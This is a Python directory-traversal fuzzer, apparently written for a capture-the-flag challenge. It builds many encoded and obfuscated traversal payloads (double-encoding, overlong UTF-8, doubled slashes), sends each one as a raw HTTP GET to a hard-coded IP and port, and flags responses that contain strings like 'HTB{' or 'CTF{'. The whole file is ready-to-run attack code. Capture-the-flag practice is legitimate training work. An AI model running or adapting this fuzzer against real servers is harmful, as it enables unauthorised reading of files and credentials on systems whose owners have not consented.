import socket
import urllib.parse
import itertools

TARGET_IP = "94.237.54.189"
TARGET_PORT = 49566
TARGET_FILE = "flag.txt"
SUCCESS_KEYWORDS = ["CTF{", "FLAG", "flag", "htb{", "thm{", "HTB{"]

def generate_payloads(filename):
    """
    Yield obfuscated traversal payloads like:
    - ../
    - ..../
    - %2e%2e/
    - ..%2f
    - ....//flag.txt
    - ..//..//flag.txt
    """

    base_bypasses = [
        "../",           # standard
        "..\\",          # Windows style
        "....//",        # multiple dots
        "..%2f",         # URL encoded /
        "%2e%2e/",       # encoded ..
        "..%252f",       # double-encoded
        "..%c0%af",      # Unicode trick
        "..%e0%80%af",   # UTF-8 encoding
        ".%2e/",         # broken-dot encoding
        "%2e%2e%2f",     # triple-encoded
    ]

    depths = range(1, 5)
    for depth in depths:
        for combo in itertools.product(base_bypasses, repeat=depth):
            path = "".join(combo) + filename
            # Yield raw and encoded variants
            yield path
            yield urllib.parse.quote(path)
            yield path.replace("/", "//")  # extra slashes
            yield urllib.parse.quote(path.replace("/", "//"))

def send_payload(path):
    try:
        s = socket.create_connection((TARGET_IP, TARGET_PORT), timeout=3)
        request = (
            f"GET /{path} HTTP/1.1\r\n"
            f"Host: {TARGET_IP}\r\n"
            "Connection: close\r\n"
            "\r\n"
        )
        s.sendall(request.encode())
        response = b""
        while True:
            data = s.recv(4096)
            if not data:
                break
            response += data
        return response.decode(errors='ignore')
    except Exception as e:
        return ""

def fuzz():
    tested = set()
    for payload in generate_payloads(TARGET_FILE):
        if payload in tested:
            continue
        tested.add(payload)

        response = send_payload(payload)
        if any(keyword in response for keyword in SUCCESS_KEYWORDS):
            print(f"[✅] SUCCESS! Payload: /{payload}")
            print("------ Response Snippet ------")
            print("\n".join(response.splitlines()[:15]))
            print("-----------------------------\n")
        else:
            print(f"[❌] Tried: /{payload}")

if __name__ == "__main__":
    fuzz()
